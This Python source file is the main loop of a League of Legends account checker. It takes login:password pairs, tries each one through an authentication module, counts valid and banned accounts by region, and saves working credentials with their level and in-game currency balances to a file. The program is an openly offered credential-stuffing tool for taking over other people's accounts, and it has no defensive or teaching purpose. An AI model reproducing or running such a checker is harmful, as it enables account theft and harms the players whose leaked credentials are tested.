from modules import auth,checkers,systems
import traceback
import os
import ctypes
from colorama import Fore,Style
import datetime
check=checkers.checkers()
sys=systems.system()

class Checker:
    def __init__(self) -> None:
        self.err=0
        self.count=0
        self.valid=0
        self.checked=0
        self.banned=0
        self.bad=[0,1,3,4]
        self.regions={
            "BR": 0,
            "EUN": 0,
            "EUW": 0,
            "JP": 0,
            "LA": 0,
            "NA": 0,
            "OC": 0,
            "RU": 0,
            "TR": 0,
            'unknown':0
        }

    def checker(self,accounts,count) -> None:
        self.count=count
        os.system(f'mode con: cols=60 lines=40')
        for account in accounts:
            ctypes.windll.kernel32.SetConsoleTitleW(f'LoLChecker by liljaba1337 | Checked {self.checked}/{count}')
            os.system('cls')
            print(f'''
    {sys.center('https://github.com/LIL-JABA/lolchecker')}
    {sys.center(f'checking {account}')}
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    >                   checked              >[{Fore.YELLOW}{self.checked}/{count}{Style.RESET_ALL}]<
    >                   valid                >[{Fore.GREEN}{self.valid}{Style.RESET_ALL}]<
    >                   banned               >[{Fore.LIGHTRED_EX}{self.banned}{Style.RESET_ALL}]<
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    >                   BR                   >[{Fore.CYAN}{self.regions['BR']}{Style.RESET_ALL}]<
    >                   EUN                  >[{Fore.CYAN}{self.regions['EUN']}{Style.RESET_ALL}]<
    >                   EUW                  >[{Fore.CYAN}{self.regions['EUW']}{Style.RESET_ALL}]<
    >                   JP                   >[{Fore.CYAN}{self.regions['JP']}{Style.RESET_ALL}]<
    >                   LA                   >[{Fore.CYAN}{self.regions['LA']}{Style.RESET_ALL}]<
    >                   NA                   >[{Fore.CYAN}{self.regions['NA']}{Style.RESET_ALL}]<
    >                   OC                   >[{Fore.CYAN}{self.regions['OC']}{Style.RESET_ALL}]<
    >                   RU                   >[{Fore.CYAN}{self.regions['RU']}{Style.RESET_ALL}]<
    >                   TR                   >[{Fore.CYAN}{self.regions['TR']}{Style.RESET_ALL}]<
    >                   UNKNOWN              >[{Fore.CYAN}{self.regions['unknown']}{Style.RESET_ALL}]<
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    >                   errors               >[{Fore.LIGHTRED_EX}{self.err}{Style.RESET_ALL}]<
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            ''')
            try:
                login=account.split(':')[0]
                password=account.split(':')[1]
                ath=auth.auth(login,password)
                token,ent,puuid,unverifmail=ath.auth()
                if token in self.bad:
                    if token==4:
                        self.banned+=1
                    self.checked+=1
                    continue
                region,level,regionid=ath.get_region(token)
                try:
                    self.regions[region]+=1
                except:
                    self.regions['unknown']+=1
                    region='N/A'

                if region != 'N/A':
                    rp,be=check.balance(token,regionid)

                self.valid+=1
                with open (f'output\\valid.txt', 'a', encoding='UTF-8') as file:
                    file.write(f'''
|[{account}]
|region: {region}
|level: {level}
|rp, blue essence: {rp}, {be}
###account###\n''')

                #inventory=check.get_inventory(self.user_info,self.region_id,login,token)
                #print(inventory)
            except Exception as e:
                with open('log.txt','a') as f:
                    f.write(f'({datetime.datetime.now()}) {str(traceback.format_exc())}\n_________________________________\n')
                self.err+=1
                #print(e)
            self.checked+=1

        os.system('cls')
        if self.err>0:
            print(f'checker has caught {self.err} errors.\nplease send the log.txt file to me (link in my github) so i will be able to improve the checker')
        print(f'''
    {sys.center('https://github.com/LIL-JABA/lolchecker')}
    {sys.center('F I N I S H E D')}
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    >                   checked              >[{Fore.YELLOW}{self.checked}/{count}{Style.RESET_ALL}]<
    >                   valid                >[{Fore.GREEN}{self.valid}{Style.RESET_ALL}]<
    >                   banned               >[{Fore.LIGHTRED_EX}{self.banned}{Style.RESET_ALL}]<
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    >                   BR                   >[{Fore.CYAN}{self.regions['BR']}{Style.RESET_ALL}]<
    >                   EUN                  >[{Fore.CYAN}{self.regions['EUN']}{Style.RESET_ALL}]<
    >                   EUW                  >[{Fore.CYAN}{self.regions['EUW']}{Style.RESET_ALL}]<
    >                   JP                   >[{Fore.CYAN}{self.regions['JP']}{Style.RESET_ALL}]<
    >                   LA                   >[{Fore.CYAN}{self.regions['LA']}{Style.RESET_ALL}]<
    >                   NA                   >[{Fore.CYAN}{self.regions['NA']}{Style.RESET_ALL}]<
    >                   OC                   >[{Fore.CYAN}{self.regions['OC']}{Style.RESET_ALL}]<
    >                   RU                   >[{Fore.CYAN}{self.regions['RU']}{Style.RESET_ALL}]<
    >                   TR                   >[{Fore.CYAN}{self.regions['TR']}{Style.RESET_ALL}]<
    >                   UNKNOWN              >[{Fore.CYAN}{self.regions['unknown']}{Style.RESET_ALL}]<
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    >                   errors               >[{Fore.LIGHTRED_EX}{self.err}{Style.RESET_ALL}]<
    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
            ''')